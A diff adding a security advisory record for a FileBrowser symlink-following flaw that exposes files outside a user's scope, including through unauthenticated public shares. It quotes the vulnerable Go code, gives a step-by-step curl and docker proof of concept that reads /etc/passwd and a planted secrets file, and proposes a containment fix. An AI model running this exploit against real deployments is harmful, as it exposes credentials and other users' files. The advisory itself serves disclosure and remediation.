@@ -1,0 +1,73 @@
+{
+  "id": "GHSA-mgqf-5mf5-prfj",
+  "modified": "2026-10-27T21:15:03.796317910Z",
+  "published": "2026-10-27T21:04:40Z",
+  "aliases": [
+    "CVE-2026-116682"
+  ],
+  "summary": "FileBrowser: Symlink following escapes user scope allowing arbitrary file read outside the served directory",
+  "details": "## Summary\n\nFile read paths resolve symbolic links with `filepath.EvalSymlinks` and then operate on the resolved target without re-checking that the target still lies inside the user's source/scope. \n\nA symlink located inside a user's accessible directory that points outside the scope (for example to `/etc/passwd`, another tenant's directory, SSH keys, or container secrets) is followed transparently, and its contents are served through the normal download, preview, media, and OnlyOffice endpoints. Any authenticated user with download access can read files anywhere the server process can, whenever such a symlink is reachable in their scope. \n\nThe same symlink-following read path is used by the public share endpoints, which are authorized only by a share hash and not by any account, so when a public share exposes a directory that contains such a symlink, an unauthenticated attacker holding only the share link reads files outside the scope with no credential.\n\n## Details\n\n**1. Symlink resolution performs no containment check (`indexing/iteminfo/utils.go:110-119`)**\n\n```go\nfunc ResolveSymlinks(path string) (string, bool, error) {\n    resolvedPath, err := filepath.EvalSymlinks(path)   // follows the link to its real target\n    if err != nil {\n        return path, false, fmt.Errorf(\"could not resolve symlinks for %s: %v\", path, err)\n    }\n    info, err := os.Lstat(resolvedPath)\n    // ...\n    return resolvedPath, IsDirectory(info), nil         // returned with no scope validation\n}\n```\n\nThere is no comparison of `resolvedPath` against the index/scope root.\n\n**2. `GetRealPath` returns the resolved target unchecked (`indexing/indexingFiles.go:991-1008`)**\n\n```go\nabsolutePath, err := filepath.Abs(joinedPath)\n// ...\nrealPath, isDir, err := iteminfo.ResolveSymlinks(absolutePath)   // escapes scope here\n// ...\nreturn realPath, isDir, err\n```\n\n`realPath` is then used by file handlers to open and serve the file. No caller re-validates that `realPath` is a descendant of the user's source root. (By contrast, the project did add containment for archive extraction via `symlinkTargetStaysUnderDest`, but that guard is specific to extraction and is not applied to this general read path.)\n\n**3. The read handlers request symlink following, including the unauthenticated public-share handlers (`http/resource.go:96,503`, `http/media.go:124`, `http/onlyOffice.go:133`, `http/public.go:279,441,494`)**\n\n```go\nFollowSymlinks: true,\n```\n\nAuthenticated download, preview, media-subtitle, and OnlyOffice read flows all set `FollowSymlinks: true`, and so do the public share handlers in `http/public.go`. The public download route is registered as `publicApi.HandleFunc(\"GET /resources/download\", withHashFile(publicDownloadHandler))` (`http/httpRouter.go:130`), where `withHashFile` authorizes by the share hash alone with no account, so the same escape is reachable with no authentication when a public share exposes a directory containing the symlink.\n\n## PoC\n\nConfirmed live on `gtstef/filebrowser:1.3.3-stable`. A symlink pointing outside the user's directory must exist inside it; here it is placed on the host volume, which is what happens whenever a bind-mounted directory contains symlinks.\n\n**1. Start a fresh container and seed a file outside the user's intended subtree.**\n```bash\ndocker rm -f fb-q-lab 2\u003e/dev/null; rm -rf /tmp/fb-q-lab; mkdir -p /tmp/fb-q-lab/srv/user1\necho \"ROOT_DB_PASSWORD=supersecret\" \u003e /tmp/fb-q-lab/srv/secret-outside.txt\ndocker run -d --name fb-q-lab -p 8090:80 -v /tmp/fb-q-lab/srv:/srv gtstef/filebrowser:1.3.3-stable \u0026\u0026 sleep 8\nTARGET_URL=http://localhost:8090\n```\n\n**2. Place symlinks inside the served tree that point outside it.** One points at a host file (`/etc/passwd`), one at the file outside the user's subtree.\n```bash\ndocker exec fb-q-lab sh -c 'ln -sf /etc/passwd /srv/user1/passwd_link; ln -sf /srv/secret-outside.txt /srv/user1/secret_link'\n```\n\n### Vector 1: authenticated user (any account with download access)\n\n**3. Log in as the default admin** (the token is passed as the `auth` query parameter).\n```bash\nADMIN_TOKEN=$(curl -s -X POST \"$TARGET_URL/api/auth/login?username=admin\" -H \"X-Password: admin\" | tr -d '\"')\n```\n\n**4. Download through the symlinks and read files from outside the scope.**\n```bash\ncurl -s \"$TARGET_URL/api/resources/download?file=/user1/passwd_link\u0026source=srv\u0026auth=$ADMIN_TOKEN\" | head -1\ncurl -s \"$TARGET_URL/api/resources/download?file=/user1/secret_link\u0026source=srv\u0026auth=$ADMIN_TOKEN\"\n```\n\nObserved output:\n```\n[passwd_link] root:x:0:0:root:/root:/bin/sh\n[secret_link] ROOT_DB_PASSWORD=supersecret\n```\n\n### Vector 2: unauthenticated, via a public share (no account)\n\n**5. The owner creates a public share of the directory** (a normal use of the share feature). This is the only step that needs an account.\n```bash\nSHARE_HASH=$(curl -s -X POST \"$TARGET_URL/api/share?auth=$ADMIN_TOKEN\" \\\n  -H 'Content-Type: application/json' -d '{\"path\":\"/user1\",\"source\":\"srv\"}' \\\n  | python3 -c \"import sys,json;print(json.load(sys.stdin)['hash'])\")\n```\n\n**6. With only the public share hash and no credential, download through the symlink.**\n```bash\ncurl -s \"$TARGET_URL/public/api/resources/download?hash=$SHARE_HASH\u0026file=/passwd_link\" | head -1\ncurl -s \"$TARGET_URL/public/api/resources/download?hash=$SHARE_HASH\u0026file=/secret_link\"\n```\n\nObserved output:\n```\n[passwd_link] root:x:0:0:root:/root:/bin/sh   (HTTP 200)\n[secret_link] ROOT_DB_PASSWORD=supersecret\n```\n\nBoth vectors follow each symlink to its target and return content from outside the served directory.\nVector 1 works for any scoped non-admin user confined to `/user1`.\nVector 2 needs no account at all, only the public share link, which is why the CVSS score uses `PR:N`.\n\n## Impact\n\n- **Arbitrary file read outside scope:** any authenticated user with download access can read any file the server process can access (host configuration, secrets, SSH keys, `/etc/passwd`, container service-account tokens, other tenants' files).\n- **Unauthenticated read via public shares:** because the public share download path follows symlinks and is authorized only by the share hash, an attacker with no account reads the same out-of-scope files using only a public share link to a directory that contains such a symlink. This is the `PR:N` worst case driving the score.\n- **Cross-tenant data exposure:** in multi-user deployments, one user reads other users' scoped files through a symlink.\n- **Broad sink coverage:** the same gap affects authenticated download, preview, media/subtitle, and OnlyOffice read flows and the public share handlers, all of which follow symlinks.\n- **Precondition:** a symlink pointing outside the scope must be reachable in the served directory (for the unauthenticated vector, inside a publicly shared directory). This is common where host directories are bind-mounted (the typical Docker deployment) or where scopes overlap shared storage.\n\n## Recommended Fix\n\nAfter resolving symlinks, verify the resolved real path is still contained within the user's source root, and reject otherwise:\n\n```go\n// indexing/indexingFiles.go, GetRealPath, after ResolveSymlinks:\nrootReal, _ := filepath.EvalSymlinks(idx.Path)\nrel, err := filepath.Rel(rootReal, realPath)\nif err != nil || rel == \"..\" || strings.HasPrefix(rel, \"..\"+string(os.PathSeparator)) {\n    return \"\", false, fmt.Errorf(\"resolved path escapes source scope\")\n}\n```\n\nApply the same containment check (or reuse the existing `symlinkTargetStaysUnderDest` logic) on every read path that sets `FollowSymlinks: true`. As a deployment-hardening option, add a setting to refuse to follow symlinks that leave the source root entirely.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gtsteffaniak/filebrowser/backend",
+        "purl": "pkg:golang/github.com/gtsteffaniak/filebrowser/backend"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260814233832-4126edeb07a0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-mgqf-5mf5-prfj/GHSA-mgqf-5mf5-prfj.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-mgqf-5mf5-prfj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116682"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gtsteffaniak/filebrowser/pull/2795"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gtsteffaniak/filebrowser/pull/2800"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gtsteffaniak/filebrowser/commit/3c8c02414eefd3351ffe437fa39ff6eb150ffa67"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gtsteffaniak/filebrowser/commit/4126edeb07a015c3809a89249b283e07a4e50c38"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gtsteffaniak/filebrowser"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gtsteffaniak/filebrowser/releases/tag/v1.5.2-stable"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gtsteffaniak/filebrowser/releases/tag/v2.0.1-beta"
+    }
+  ]
+}
